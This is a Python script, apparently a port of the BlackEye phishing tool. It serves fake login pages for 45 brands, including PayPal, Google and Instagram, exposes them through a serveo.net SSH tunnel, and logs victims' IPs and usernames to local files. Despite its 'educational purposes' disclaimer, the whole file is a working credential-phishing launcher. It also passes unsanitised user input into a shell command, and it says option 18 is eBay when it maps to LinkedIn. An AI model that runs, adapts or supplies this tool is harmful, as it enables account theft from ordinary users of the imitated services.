import os, sys, subprocess

class colors:
    BLACK  = '\33[30m'
    RED    = '\33[31m'
    GREEN  = '\33[32m'
    YELLOW = '\33[33m'
    BLUE   = '\33[34m'
    VIOLET = '\33[35m'
    BEIGE  = '\33[36m'
    WHITE  = '\33[37m'
    BLACKBG  = '\33[40m'
    REDBG    = '\33[41m'
    GREENBG  = '\33[42m'
    YELLOWBG = '\33[43m'
    BLUEBG   = '\33[44m'
    VIOLETBG = '\33[45m'
    BEIGEBG  = '\33[46m'
    WHITEBG  = '\33[47m'
    END      = '\33[0m'

try:
    print(colors.RED + """
                        BlackEye Python

Original Shell Program Created By thelinuxchoice
Link to Original: https://github.com/thelinuxchoice/blackeye

Differences:
    - This is written in Python
    - Uses Serveo with A Custom Sub-Domain

                        :: DISCLAIMER ::

I nor the original developers take any responsibility for actions caused
by using this program. Any misuse or damage caused by BlackEye is on the
users behalf. Use for EDUCATIONAL PURPOSES!
    """ + colors.END)

    print(colors.GREEN + """
                       Availble Templates

[1] ADOBE   	    [12] GITLAB	        [23] ORIGIN 	    [34] STEAM      
[2] AMAZON  	    [13] GOOGLE	        [24] PAYPAL         [35] TIKTOK
[3] APPLE           [14] ICLOUD         [25] PINTEREST      [36] TWITCH
[4] BADOO   	    [15] INSTAFOLLOWERS	[26] PLAYSTATION    [37] TWITTER    
[5] BITCOIN         [16] INSTAGRAM      [27] PROTONMAIL     [38] VERIZON    
[6] CREATE          [17] LINE           [28] REDDIT         [39] VK
[7] CRYPTOCURRENCY  [18] LINKEDIN       [29] SHOPIFY        [40] WIFI   
[8] DEVIANART       [19] MESSENGER  	[30] SHOPPING       [41] WORDPRESS  
[9] DROPBOX         [20] MICROSOFT  	[31] SNAPCHAT       [42] YAHOO
[10] FACEBOOK       [21] MYSPACE        [32] SPOTIFY        [43] YANDEX
[11] GITHUB         [22] NETFLIX    	[33] STACKOVERFLOW  [44] BIGOTV    [45] CUSTOM

Please Choose A Number To Host Template:
    """ + colors.END)
    templates = {
    '1':   'adobe',
    '2':   'amazon',
    '3':   'apple',
    '4':   'badoo',
    '5':   'bitcoin',
    '6':   'create',
    '7':   'cryptocurrency',
    '8':   'devianart',
    '9':   'dropbox',
    '10':   'facebook',
    '11':   'github',
    '12':   'gitlab',
    '13':   'google',
    '14':   'icloud',
    '15':   'instafollowers',
    '16':   'instagram',
    '17':   'line',
    '18':   'linkedin',
    '19':   'messenger',
    '20':   'microsoft',
    '21':   'myspace',
    '22':   'netflix',
    '23':   'origin',
    '24':   'paypal',
    '25':   'pinterest',
    '26':   'playstation',
    '27':   'protonmail',
    '28':   'reddit',
    '29':   'shopify',
    '30':   'shopping',
    '31':   'snapchat',
    '32':   'spotify',
    '33':   'stackoverflow',
    '34':   'steam',
    '35':   'tiktok',
    '36':   'twitch',
    '37':   'twitter',
    '38':   'verizon',
    '39':   'vk',
    '40':   'wifi',
    '41':   'wordpress',
    '42':   'yahoo',
    '43':   'yandex',
    '44':   'bigotv',
    '45':   'custom'
    }
    number = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
    if number == "18":
        print("Ebay Currently Does Not Work. Choose Another..")
        exit()
    else:
        pass
    choice = templates[number]
    print("Loading %s" % (choice))
    print("\nEnter A Custom Subdomain")
    subdom = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
    print(colors.GREEN + "Starting Server at %s.serveo.net..." % (subdom))
    print("Logs Can Be Found In sites/%s/ip.txt and sites/%s/usernames.txt" % (choice, choice) + colors.END)
    cmd_line = "sudo php -t sites/%s -S 127.0.0.1:80 & ssh -R %s.serveo.net:80:127.0.0.1:80 serveo.net" % (choice, subdom)
    p = subprocess.Popen(cmd_line, shell=True)
    out = p.communicate()[0]


except KeyboardInterrupt:
    pass
